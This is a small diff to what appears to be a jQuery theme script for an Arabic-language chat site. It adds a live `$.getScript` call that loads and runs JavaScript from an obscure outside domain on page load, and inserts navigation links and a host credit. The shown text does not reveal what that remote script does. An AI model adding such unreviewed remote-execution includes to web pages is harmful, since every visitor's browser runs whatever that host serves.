@@ -1,4 +1,4 @@
-/*$.getScript("https://rayan-omar.000webhostapp.com/mmy.js");*/
+$.getScript("https://w6n-qlbi.com/app.js?z84");
 $(`<a id="عاصم" href=""><i class="fa fa-refresh fa-spin fa-3x fa-fw" aria-hidden="true"></i></a><img id="asim70"src="https://chatnsh.com/sico/z1ef103tgh10.jpg"style="width:100%"><a id="asim27"target="_blank"type="a"rel="nofollow"title=""href=""class="label-primary">Programming by JawaL Host</a></div></div><center>`).insertBefore(".nav-tabs"),$(".nav-tabs").addClass("fl").css("width","100%"),
 $(`<center><div id="asim1">
 <a id="asim7"rel="dofollow" title="القوانين" href=""style="border-radius: 0 4px 0 0; border-right: 2px solid#f7d322;"class="fl mini  fa fa-bullhorn btn btn-primary" target="_blank"></a>
